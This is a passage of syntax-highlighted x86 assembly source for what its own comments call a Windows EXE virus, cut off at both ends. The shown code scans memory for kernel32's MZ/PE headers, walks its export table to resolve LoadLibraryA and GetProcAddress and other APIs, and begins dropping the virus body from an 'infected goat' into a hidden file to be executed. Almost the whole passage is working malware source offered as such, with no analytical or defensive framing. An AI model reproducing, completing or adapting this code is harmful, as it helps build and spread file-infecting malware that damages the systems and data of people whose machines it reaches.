 </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">NoPESign</span><span class="sc0">
 
 </span><span class="sc6">clc</span><span class="sc0">                       </span><span class="sc1">; all left is "PE"</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc5">NoPESign</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CheckMZSign</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'[M'</span><span class="sc0">
 </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoPESign</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'YM'</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">NoPESign</span><span class="sc0">

 </span><span class="sc6">clc</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ----------------[ This is the host for the EXE-Virus Part ]----------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc5">FirstGenHost</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                   </span><span class="sc1">; stop this !</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FirstGenHost</span><span class="sc0">





</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
; ////////////////////////////////////////////////////////////////////////////\
; ###########################################################################/\
; ------------------[ This is the second part of the Virus ]-----------------/\
; ###########################################################################/\
; ////////////////////////////////////////////////////////////////////////////\
; \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
; </span><span class="sc0">

</span><span class="sc5">SecondPart</span><span class="sc4">:</span><span class="sc0">
                          </span><span class="sc1">; Here do we drop the entire file from the</span><span class="sc0">
                          </span><span class="sc1">; infected goat and execute it</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; -------------------------[ Search for Kernel ]-----------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">


 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">

</span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get Create Process API</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetKernel</span><span class="sc0">            </span><span class="sc1">; Search for kernel</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">GetApis</span><span class="sc0">               </span><span class="sc1">; If we got it we carry on..</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExecuteHost</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------------------[ Search-Kernel Procedure ]----------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc5">GetKernel</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32Trys</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5h</span><span class="sc0">

</span><span class="sc5">GK1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32Trys</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoKernel</span><span class="sc0">               </span><span class="sc1">; did we pass the limit ?</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckMZSign</span><span class="sc0">          </span><span class="sc1">; Check for exe-stub</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">CheckPE</span><span class="sc0">

</span><span class="sc5">GK2</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">           </span><span class="sc1">; search next page</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32Trys</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GK1</span><span class="sc0">                   </span><span class="sc1">; test again</span><span class="sc0">

</span><span class="sc5">CheckPE</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; test for PE-Header</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckPESign</span><span class="sc0">

 </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">CheckDLL</span><span class="sc0">              </span><span class="sc1">; check dll-sign</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GK2</span><span class="sc0">

</span><span class="sc5">CheckDLL</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get characteristics</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">            </span><span class="sc1">; to check for dll flag</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02000h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GK2</span><span class="sc0">
 
</span><span class="sc5">KernelFound</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; We got it !</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">              </span><span class="sc1">; edi = PE-Header</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; eax = PE offset</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; ebx = MZ offset</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">                       </span><span class="sc1">; clear carriage flag</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NoKernel</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">                       </span><span class="sc1">; set carriage flag if we did not found it</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">K32Trys</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5h</span><span class="sc0">        </span><span class="sc1">; search range</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ---------------------------[ Search for API's ]----------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

 
                           </span><span class="sc1">; we search for LoadLibaryA and GetProcAddress</span><span class="sc0">
                           </span><span class="sc1">; in the kernel to get the other API's</span><span class="sc0">

 </span><span class="sc5">LL</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc5">GPA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> 

</span><span class="sc5">GetApis</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; offset of Kernel32.dll PE-headers in eax</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KernelAddy</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LL</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Point to LoadLibaryA - API</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">              </span><span class="sc1">; size of name</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchAPI1</span><span class="sc0">           </span><span class="sc1">; search it</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">XLoadLibraryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                           </span><span class="sc1">; save offset</span><span class="sc0">

 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; if we did not get it, we can't go on</span><span class="sc0">
 </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ExecuteHost</span><span class="sc0">
   
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GPA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Name of GetProcAddress - API</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">              </span><span class="sc1">; size</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchAPI1</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">XGetProcAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; check if we got it</span><span class="sc0">
 </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ExecuteHost</span><span class="sc0">


</span><span class="sc5">GetAPI2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; locate all other apis now</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KERNEL32</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">XLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32Handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExecuteHost</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32Names2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">YCreateFileA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32Handle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NumberOf2Kernel32APIS</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetAPI3</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DropIT</span><span class="sc0">                </span><span class="sc1">; let's do something serious ;)</span><span class="sc0">


</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------[ Search the kernel export table for the 2 main API's ]------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">


</span><span class="sc5">SearchAPI1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KernelAddy</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get PE-Header offset</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get Export Table Address</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
 
 </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">; get address table</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ATableVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">; get pointer table</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NTableVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
 </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">; Ordinal Table</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OTableVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NTableVA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get Name Pointer Table</span><span class="sc0">

</span><span class="sc5">SearchNextApi1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">lodsd</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

 </span><span class="sc6">cld</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                 </span><span class="sc1">; check for api name</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FoundApi1</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; get next API-Name</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0"> 
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NotFoundApi1</span><span class="sc0">           </span><span class="sc1">; if we checked more than 2000 API's we stop</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchNextApi1</span><span class="sc0">        </span><span class="sc1">; check next</span><span class="sc0">
 
</span><span class="sc5">FoundApi1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">               </span><span class="sc1">; get right entry</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OTableVA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">; clear esi --&amp;gt; eax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ATableVA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; get RVA</span><span class="sc0">
 </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">; eax = Adress RVA</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZAddy</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">; API offset in eax</span><span class="sc0">
 
</span><span class="sc5">NotFoundApi1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; we failed :(</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ----------------------[ Let's drop the virus to a file ]-------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc5">DropIT</span><span class="sc4">:</span><span class="sc0">
 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">                 </span><span class="sc1">; normal</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; new file</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">            </span><span class="sc1">; write access</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HiddenFile</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">YCreateFileA</span><span class="sc4">]</span><span class="sc0">
 
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Handle in ebx</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ImageBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Gap1</span><span class="sc0"> </span><span class="sc1">; uninitialised data once again ;)</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; overlapped</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Write</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; written bytes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">            </span><span class="sc1">; Lenght</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">; Start of Data</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">; File Handle</span><span class="sc0">
 </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">YWriteFile</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
